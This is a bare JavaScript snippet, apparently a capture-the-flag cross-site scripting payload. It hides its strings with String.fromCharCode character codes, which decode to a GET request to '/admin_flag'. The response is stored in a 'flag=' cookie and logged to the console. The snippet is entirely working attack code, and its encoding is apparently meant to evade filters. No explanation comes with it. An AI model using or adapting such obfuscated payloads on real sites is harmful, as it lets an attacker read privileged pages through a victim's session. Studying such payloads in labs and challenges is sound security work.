var xhr = new XMLHttpRequest();
xhr.open(String.fromCharCode(71,69,84), String.fromCharCode(47,97,100,109,105,110,95,102,108,97,103), true);


xhr.onload = function () {
    if (xhr.readyState === xhr.DONE) {
        if (xhr.status === 200) {
            document.cookie = String.fromCharCode(102,108,97,103,61)+xhr.responseText;
            console.log(document.cookie);
            console.log(xhr.response);
            console.log(xhr.responseText);
        }
    }
};

xhr.send(null);
